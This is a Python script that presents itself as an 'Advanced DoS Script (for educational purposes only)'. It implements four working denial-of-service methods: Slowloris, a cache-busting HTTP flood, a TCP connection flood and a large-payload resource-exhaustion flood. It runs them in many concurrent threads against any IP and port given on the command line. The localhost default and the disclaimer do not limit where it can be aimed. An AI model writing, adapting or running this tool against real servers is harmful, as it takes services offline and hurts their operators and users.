import logging
import socket
import threading
import time
import statistics
import sys
import random
import string
import argparse
from concurrent.futures import ThreadPoolExecutor

# Configure colored logging
try:
    import colorlog
    
    handler = colorlog.StreamHandler()
    handler.setFormatter(colorlog.ColoredFormatter(
        '%(log_color)s%(asctime)s - %(message)s',
        log_colors={
            'INFO': 'green',
            'WARNING': 'yellow',
            'ERROR': 'red',
            'CRITICAL': 'red,bg_white',
        }
    ))
    
    logger = colorlog.getLogger()
    logger.setLevel(logging.INFO)
    logger.handlers = [handler]
except ImportError:
    # Fallback to standard logging if colorlog is not installed
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(message)s',
        datefmt='%H:%M:%S'
    )
    logger = logging.getLogger()
    print("For colored logs, install colorlog: pip install colorlog")




# Statistics tracking
request_count = 0
connection_count = 0
response_times = []
summary_interval = 50
lock = threading.Lock()
stop_event = threading.Event()

# Generate random data
def random_string(length=10):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

# Attack methods
def slowloris_attack():
    """
    Slowloris attack - keeps connections open by sending partial HTTP headers at regular intervals
    """
    global connection_count
    
    sockets_list = []
    try:
        # Create multiple sockets
        for _ in range(MAX_CONNECTIONS):
            if stop_event.is_set():
                break
                
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(SOCKET_TIMEOUT)
                s.connect((TARGET_IP, TARGET_PORT))
                
                # Send partial HTTP header
                s.send(f"GET /?{random_string(5)} HTTP/1.1\r\n".encode())
                s.send(f"User-Agent: Mozilla/5.0 {random_string(10)}\r\n".encode())
                s.send(f"Accept-language: en-US,en,q=0.5\r\n".encode())
                sockets_list.append(s)
                
                with lock:
                    connection_count += 1
                    if connection_count % summary_interval == 0:
                        logger.info(f"Slowloris: {connection_count} connections established")
                
            except socket.error as e:
                logger.error(f"Socket error: {e}")
                
        # Keep connections alive
        while not stop_event.is_set():
            for s in list(sockets_list):
                try:
                    # Send a partial header to keep the connection alive
                    s.send(f"X-a: {random_string(5)}\r\n".encode())
                except socket.error:
                    sockets_list.remove(s)
                    try:
                        # Replace the broken socket
                        new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_socket.settimeout(SOCKET_TIMEOUT)
                        new_socket.connect((TARGET_IP, TARGET_PORT))
                        new_socket.send(f"GET /?{random_string(5)} HTTP/1.1\r\n".encode())
                        sockets_list.append(new_socket)
                    except socket.error:
                        logger.error("Failed to replace broken socket.")
                        
            # Wait before sending more partial headers
            time.sleep(10)
            
    except Exception as e:
        logger.error(f"Slowloris error: {e}")
    finally:
        # Close all sockets
        for s in sockets_list:
            try:
                s.close()
            except:
                pass

def http_flood():
    """
    HTTP Flood - sends a large number of HTTP requests with random parameters to bypass caching
    """
    global request_count, response_times
    
    while not stop_event.is_set():
        try:
            start_time = time.time()
            
            # Create a new socket for each request
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(SOCKET_TIMEOUT)
            s.connect((TARGET_IP, TARGET_PORT))
            
            # Create a random parameter string to bypass caching
            random_params = '&'.join([f"{random_string(5)}={random_string(10)}" for _ in range(10)])
            request = f"GET /?{random_params} HTTP/1.1\r\nHost: {TARGET_IP}:{TARGET_PORT}\r\n"
            request += f"User-Agent: Mozilla/5.0 ({random_string(20)})\r\n"
            request += f"Accept-Encoding: gzip, deflate\r\n"
            request += f"Accept: */*\r\n"
            request += f"Connection: keep-alive\r\n"
            request += f"Cache-Control: no-cache\r\n"
            request += f"Pragma: no-cache\r\n"
            request += f"Content-Length: {random.randint(2000, 8000)}\r\n\r\n"
            request += random_string(random.randint(2000, 8000))
            
            s.send(request.encode())
            
            # Wait for response
            response = s.recv(4096)
            s.close()
            
            end_time = time.time()
            response_time = end_time - start_time
            
            with lock:
                request_count += 1
                response_times.append(response_time)
                
                if request_count % summary_interval == 0:
                    avg_time = statistics.mean(response_times[-summary_interval:])
                    max_time = max(response_times[-summary_interval:])
                    
                    logger.info(f"HTTP Flood: Request #{request_count} | Response Time: {response_time:.4f}s | "
                                f"Avg: {avg_time:.4f}s | Max: {max_time:.4f}s")
                    
                    # Clear old response times to prevent memory buildup
                    if len(response_times) > 1000:
                        response_times = response_times[-100:]
            
        except Exception as e:
            logger.error(f"HTTP Flood error: {e}")
            time.sleep(0.5)  # Back off on errors

def tcp_connection_flood():
    """
    TCP Connection Flood - creates and closes connections rapidly
    """
    global connection_count
    
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((TARGET_IP, TARGET_PORT))
            
            with lock:
                connection_count += 1
                if connection_count % summary_interval == 0:
                    logger.info(f"TCP Flood: {connection_count} connections established")
            
            # Close immediately to free resources on our side but consume resources on server
            s.close()
            
        except Exception as e:
            logger.error(f"TCP Flood error: {e}")
            time.sleep(0.5)  # Back off on errors

def resource_exhaustion():
    """
    Resource Exhaustion - sends large requests with high memory/CPU processing requirements
    """
    global request_count, response_times
    
    while not stop_event.is_set():
        try:
            start_time = time.time()
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(SOCKET_TIMEOUT)
            s.connect((TARGET_IP, TARGET_PORT))
            
            # Create a request with a very large payload (to consume memory)
            # and potentially complex parameters (to consume CPU)
            large_payload = random_string(random.randint(10000, 100000))
            nested_params = ""
            for i in range(20):
                nested_params += f"param{i}[]="
            nested_params += "value"
            
            request = f"POST /?{nested_params} HTTP/1.1\r\nHost: {TARGET_IP}:{TARGET_PORT}\r\n"
            request += f"User-Agent: Mozilla/5.0 ({random_string(20)})\r\n"
            request += f"Accept-Encoding: gzip, deflate\r\n"
            request += f"Accept: */*\r\n"
            request += f"Connection: keep-alive\r\n"
            request += f"Content-Type: application/x-www-form-urlencoded\r\n"
            request += f"Content-Length: {len(large_payload)}\r\n\r\n"
            request += large_payload
            
            s.send(request.encode())
            
            response = s.recv(4096)
            s.close()
            
            end_time = time.time()
            response_time = end_time - start_time
            
            with lock:
                request_count += 1
                response_times.append(response_time)
                
                if request_count % summary_interval == 0:
                    avg_time = statistics.mean(response_times[-summary_interval:])
                    max_time = max(response_times[-summary_interval:])
                    
                    logger.info(f"Resource Exhaustion: Request #{request_count} | Response Time: {response_time:.4f}s | "
                                f"Avg: {avg_time:.4f}s | Max: {max_time:.4f}s")
                    
                    # Clear old response times to prevent memory buildup
                    if len(response_times) > 1000:
                        response_times = response_times[-100:]
            
        except Exception as e:
            logger.error(f"Resource Exhaustion error: {e}")
            time.sleep(1)  # Back off on errors

def main():

    # Configuration
# TARGET_IP = "127.0.0.1"
# TARGET_PORT = 8000
# MAX_CONNECTIONS = 500
# SOCKET_TIMEOUT = 10
# ATTACK_DURATION = 600  # 10 minutes by default
    parser = argparse.ArgumentParser(description="Advanced DoS Script (for educational purposes only)")
    parser.add_argument("--ip", default="127.0.0.1", help=f"Target IP address (default: {"127.0.0.1"})")
    parser.add_argument("--port", type=int, default=8000, help=f"Target port (default: {8000})")
    parser.add_argument("--duration", type=int, default=600, help=f"Attack duration in seconds (default: {600})")
    parser.add_argument("--connections", type=int, default=500, help=f"Maximum connections (default: {500})")
    parser.add_argument("--timeout", type=int, default=10, help=f"Socket timeout in seconds (default: {10})")
    
    attack_group = parser.add_mutually_exclusive_group()
    attack_group.add_argument("--all", action="store_true", help="Run all attack methods (default)")
    attack_group.add_argument("--slowloris", action="store_true", help="Run only Slowloris attack")
    attack_group.add_argument("--http-flood", action="store_true", help="Run only HTTP flood attack")
    attack_group.add_argument("--tcp-flood", action="store_true", help="Run only TCP connection flood attack")
    attack_group.add_argument("--resource", action="store_true", help="Run only resource exhaustion attack")
    
    args = parser.parse_args()
    
    global TARGET_IP, TARGET_PORT, MAX_CONNECTIONS, SOCKET_TIMEOUT, ATTACK_DURATION, request_count, connection_count, response_times, summary_interval


    TARGET_IP = args.ip
    TARGET_PORT = args.port
    MAX_CONNECTIONS = args.connections
    SOCKET_TIMEOUT = args.timeout
    ATTACK_DURATION = args.duration
    
    print("\n" + "="*60)
    print(f"Advanced DoS Attack Demonstration (EDUCATIONAL PURPOSES ONLY)")
    print("="*60)
    print(f"Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"Duration: {ATTACK_DURATION} seconds")
    print(f"Max Connections: {MAX_CONNECTIONS}")
    print("="*60)
    print("Press Ctrl+C to stop the attack\n")
    
    # Determine which attacks to run
    run_all = args.all or not (args.slowloris or args.http_flood or args.tcp_flood or args.resource)
    
    attacks = []
    if args.slowloris or run_all:
        attacks.append(("Slowloris", slowloris_attack))
    if args.http_flood or run_all:
        attacks.append(("HTTP Flood", http_flood))
    if args.tcp_flood or run_all:
        attacks.append(("TCP Connection Flood", tcp_connection_flood))
    if args.resource or run_all:
        attacks.append(("Resource Exhaustion", resource_exhaustion))
    
    # Launch attack threads
    threads = []
    for attack_name, attack_func in attacks:
        logger.info(f"Starting {attack_name} attack...")
        for _ in range(5 if attack_name == "Slowloris" else 25):  # Fewer Slowloris threads needed
            thread = threading.Thread(target=attack_func)
            thread.daemon = True
            thread.start()
            threads.append(thread)
    
    try:
        # Run for specified duration or until interrupted
        time.sleep(ATTACK_DURATION)
        stop_event.set()
        
    except KeyboardInterrupt:
        stop_event.set()
        logger.info("Stopping attack...")
    
    finally:
        # Calculate final statistics
        with lock:
            avg_time = statistics.mean(response_times) if response_times else 0
            max_time = max(response_times) if response_times else 0
        
        print("\n" + "="*60)
        print(f"Attack Summary:")
        print(f"Total HTTP Requests: {request_count}")
        print(f"Total TCP Connections: {connection_count}")
        print(f"Average Response Time: {avg_time:.4f}s")
        print(f"Maximum Response Time: {max_time:.4f}s")
        print("="*60)
        sys.exit(0)

if __name__ == "__main__":
    main()
